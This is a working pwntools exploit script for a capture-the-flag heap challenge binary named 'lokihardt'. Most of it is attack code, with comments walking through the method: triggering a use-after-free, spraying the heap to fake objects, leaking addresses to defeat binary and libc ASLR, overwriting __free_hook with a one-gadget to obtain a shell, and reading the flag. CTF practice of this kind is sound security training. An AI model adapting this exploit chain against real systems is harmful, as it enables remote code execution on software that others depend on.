#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host 127.0.0.1 --port 9027 lokihardt
import os

os.environ["PWNLIB_NOTERM"] = "1"
os.environ["PWNLIB_COLOR"] = "always"

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'lokihardt')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 9027)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# there are several vulnerabilities here:
# 1. Delete does not check we delete a reference and decrefs in any case, thus giving us a UAF with alloc(0), delete(1), gc()
# 2. both Delete and Alloc allow OOB writes to ArrayBuffer

# as ArrayBuffer is the last variable in page, we will use the UAF to pwn this binary. ideally, we want a data-only exploit,
# i.e., one that does not involve heap metadata corruptions. to do so, we will try to fake an OBJ struct and call Use on it.
# the biggest challenge here is that Use requires type to point to some fixed strings in order to do something interesting
# but we have no known address to start with as the binary is PIC (and heap, stack and libs addresses are randomized). thus,
# we start by breaking the binary ASLR.

# as said, we cannot fake any pointer yet as we dont know any address. however, we can overlap any field of a UAFed object
# with any field of an object allocated over it. a good candidate is to overlap the UAFed type with a wdata of another struct
# as we can control wdata contents. to do so, we want the random allocation to look like that:
# ┌───────────────────────────┬───────┐
# │                           │       │
# │   sizeof(OBJ) * n - 0x10  │  OBJ  │
# │                           │       │
# └───────────────────────────┴───────┘
# so that after we trigger the uaf we will have
#                               w
#                               d t
#                               a y
#                               t p
#                               a e
#                               │ │
#                               ├─┘
#                               │
# ┌───────┬───────┬───────┬───┬─┴─┬───┐
# │       │       │       │   │   │   │
# │       │       │       │   │  O│J  │
# │       │       │       │   │   │   │
# └───────┴───────┴───────┴───┴───┴───┘
# which is what we want as using the UAFed object will read 256 bytes from its start which will include the previous objects' type pointer
# (this is ok as there are no tcachebins and bins are limited to smaller sizes, thus the sprayed OBJs can allocate over the freed randomPadding)
# this happens with probability ~3/64 as the possible sizes for the padding are range(16, 1025, 16) which contain 64 value, of which only 3 has the
# correct value mod sizeof(OBJ)

# so now we have the binary base addresses. we can trigger more UAFs but now spray so that type points to the static strings of the binary, giving
# us more OOB reads and absolute writes. this spray is successful with high probability as the controlled data is 256 bytes which is much larger
# than the pointers we try to hit.

# so what can we overwrite now? here comes the second challenge - we have full relro so a classic got overwrite wont do. also, as sprayed objects are
# leaked, we need to trigger the UAF and spray for each R/W which is hard. luckily, we know an address of a controlled location - g_buf!
# with a single write to ArrayBuffer we can create a fake object so that its wdata and length point to g_buf - allowing us to change them
# at any time! what will by this object's type? miraculously, ArrayBuffer[0]! as it starts with rdata which we control, we can change the type
# at will too. this gives us a stable OOB read/absolute write primitive.

# what can we read with this OOB read? again, miraculously, the rdata of the fake OBJ lands on the got table - as it comes just before g_buf
# this leaks many libc addresses. now we do a cookbook exploit - overwrite __free_hook with a libc onegadget, and free a pointer with gc().



context.terminal = ["kitty"]

from enum import IntEnum

class MenuChoice(IntEnum):
    Alloc = 1
    Delete = 2
    Use = 3
    GarbageCollect = 4
    HeapSpray = 5

def do_menu(io, choice):
    io.sendlineafter(b"> ", b"%d" % choice)

def alloc(io, index, rdata=None, wdata=None):
    do_menu(io, MenuChoice.Alloc)
    io.sendlineafter(b"idx? ", b"%d" % index)

    if rdata or wdata:
        assert rdata and wdata
        alloc_obj(io, rdata, wdata)

def delete(io, index):
    do_menu(io, MenuChoice.Delete)
    io.sendlineafter(b"idx? ", b"%d" % index)

def use(io, index, data=None):
    do_menu(io, MenuChoice.Use)
    io.sendlineafter(b"idx? ", b"%d" % index)

    if data is None:
        return io.recv(256)
    else:
        io.recvuntil(b"your data?", timeout=1)
        io.send(data)

def gc(io):
    do_menu(io, MenuChoice.GarbageCollect)

RDATA_LEN = 256
WDATA_LEN = 16

def alloc_obj(io, rdata, wdata):
    assert len(rdata) == RDATA_LEN
    assert len(wdata) == WDATA_LEN
    io.send(rdata)
    io.send(wdata)

def heap_spray(io, rdata, wdata):
    do_menu(io, MenuChoice.HeapSpray)
    alloc_obj(io, rdata, wdata)

READ = b"read".ljust(16, b"\x00")
READ256 = b"read".ljust(256, b"\x00")
WRITE256 = b"write".ljust(256, b"\x00")

class HeapShapingException(Exception):
    pass

def trigger_uaf(io):
    alloc(io, 0, b"A" * 256, READ)

    delete(io, 1)  # 1 is not allocated - trigger UAF!
    gc(io)

def break_binary_aslr(io, exe):
    trigger_uaf(io)

    for _ in range(8):
        heap_spray(io, b"B" * 256, READ)

    try:
        leaked_data = use(io, 0)
    except EOFError:
        raise HeapShapingException("rand allocation size was incorrect...")

    null_rodata_address = u64(leaked_data[:8])
    info('leaked "null" address: 0x%x' % null_rodata_address)

    exe.address = null_rodata_address - next(exe.search(b"null"))
    success('leaked lokihardt base address: 0x%x' % exe.address)

    if exe.address & 0xfff:
        raise HeapShapingException("rand allocation size was incorrect...")

def _create_fake_spray_obj(exe, addr, length):
    write_addr = next(exe.search(b"write\x00"))

    return (
        pack(addr)        +  # wdata
        pack(length)      +  # length
        pack(write_addr)  +  # type
        pack(0)              # pad
    ) * 8

def create_fake_obj(io, exe):
    trigger_uaf(io)

    # spray with fake objects
    for _ in range(8):
        # point theOBJ->type = "write", theOBJ->wdata = &ArrayBuffer[1], theOBJ->length = 8
        heap_spray(io, _create_fake_spray_obj(exe, exe.sym["ArrayBuffer"]+8, 8), READ)

    # write ArrayBuffer[1]=g_buf-0x100
    use(io, 0, pack(exe.sym["g_buf"]-0x100))

def fake_obj_read(io):
    alloc(io, 0, READ256, b"C" * 16)  # make ArrayBuffer[1]->type = "read"
    data = use(io, 1)
    delete(io, 0)

    return data

def fake_obj_write(io, addr, data):
    # ArrayBuffer[1]->type = "write"
    # ArrayBuffer[1]->wdata = addr
    # ArrayBuffer[1]->length = len(data)
    alloc(io, 0, WRITE256, pack(addr) + pack(len(data)))
    use(io, 1, data)
    delete(io, 0)

def break_libc_aslr(io, libc):
    try:
        data = fake_obj_read(io)
    except EOFError:
        raise HeapShapingException("...")
        
    read_addr = u64(data[0x40:0x48])
    info('leaked read address: 0x%x' % read_addr)
    
    libc.address = read_addr - libc.sym["read"]
    success('leaked libc base address: 0x%x' % libc.address)
    
    if libc.address & 0xfff:
        raise HeapShapingException("heap shaping failed (libc aslr break)...")

def overwrite_free_hook(io, libc):
    one_gadget_addr = libc.address + 0x4527a

    fake_obj_write(io, libc.sym["__free_hook"], pack(one_gadget_addr))

def trigger_one_gadget(io):
    gc(io)

def pwn(io):
    exe = ELF(context.binary.path)
    libc = exe.libc
    
    info("breaking binary aslr")
    break_binary_aslr(io, exe)

    info("creating fake object")
    create_fake_obj(io, exe)

    info("breaking libc aslr")
    break_libc_aslr(io, libc)

    info("overwriting __free_hook")
    overwrite_free_hook(io, libc)

    info("jumping to onegadget")
    trigger_one_gadget(io)

for _ in range(0x100):
    io = start()

    try:
        pwn(io)
        io.sendline(b"echo AAAAAAAA; cat flag")
        io.recvuntil(b"AAAAAAAA\n")
        success('flag = "{}"'.format(term.text.bold_italic_yellow(io.recvline().strip().decode())))
        break
    except HeapShapingException as e:
        info("heap shape failed: {}".format(e))

    io.close()
